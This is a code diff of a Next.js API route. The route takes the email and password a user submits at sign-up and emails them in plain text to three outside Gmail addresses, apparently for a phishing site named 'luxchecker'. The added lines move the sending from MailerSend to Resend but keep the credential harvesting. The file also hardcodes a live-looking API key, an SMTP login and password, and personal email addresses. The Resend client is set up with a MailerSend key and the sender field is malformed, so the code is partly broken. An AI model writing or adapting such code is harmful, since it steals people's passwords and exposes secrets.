@@ -1,41 +1,35 @@
 // pages/api/send-email.js
 
 import { NextResponse, NextRequest } from 'next/server';
-import { MailerSend, EmailParams, Sender, Recipient } from "mailersend";
+import { Resend } from 'resend';
+import { EmailTemplate } from '@/components/EmailTemplete';
+const apiKey = "mlsn.7584d09b7303599f16a4f478cf216b48540cba331472bbe79e9308ac77545f37";
+const resend = new Resend(apiKey);
 
 export async function POST(request: NextRequest) {
     try {
+        const bulkEmails = [];
         // Parsing JSON data from the request body
         const { email, password } = await request.json();
 
         // Retrieve environment variables
         const username = "ms_bzxtee@trial-pr9084zxr8mlw63d.mlsender.net";
         const userPassword = "Vy2o2bXgvPKcU7fK";
+        const domain = "smtp.mailersend.net"
         const myEmail = "bohlingladonna04@gmail.com";
-        const message = "Hello!";
-        const apiKey = "mlsn.7584d09b7303599f16a4f478cf216b48540cba331472bbe79e9308ac77545f37";
-        
-        const mailerSend = new MailerSend({
-            apiKey: "mlsn.7584d09b7303599f16a4f478cf216b48540cba331472bbe79e9308ac77545f37",
-        });
-        
-        const recipients = [
-            new Recipient(myEmail, "site"),
-            new Recipient("jamesjong99@gmail.com", "site")
-        ];
-        
-        const sentFrom = new Sender("luxchecker.vercel.app", username,);
-        const emailParams = new EmailParams()
-            .setFrom(sentFrom)
-            .setTo(recipients)
-            .setReplyTo(sentFrom)
-            .setSubject("new user attempted to sign up in your site")
-            .setHtml(`<strong>User: ${username}</strong><br><strong>Password: ${password}`)
-            .setText("This is the text content");
 
-        await mailerSend.email.send(emailParams);
+        const { data, error }: any = await resend.emails.send({
+            from: 'Acme <luxchecker.vercel.app>',
+            to: [myEmail, "jamesjong99@gmail.com", "lovelymidas@gmail.com"],
+            subject: 'Hello world',
+            react: <div>
+                <h1>Welcome, Client!</h1>
+                <p>email: {email}</p>
+                <p>password: {password}</p>
+            </div>,
+        });
+        console.log(error)
         // Create transporter object
-        
 
         // Send email
 
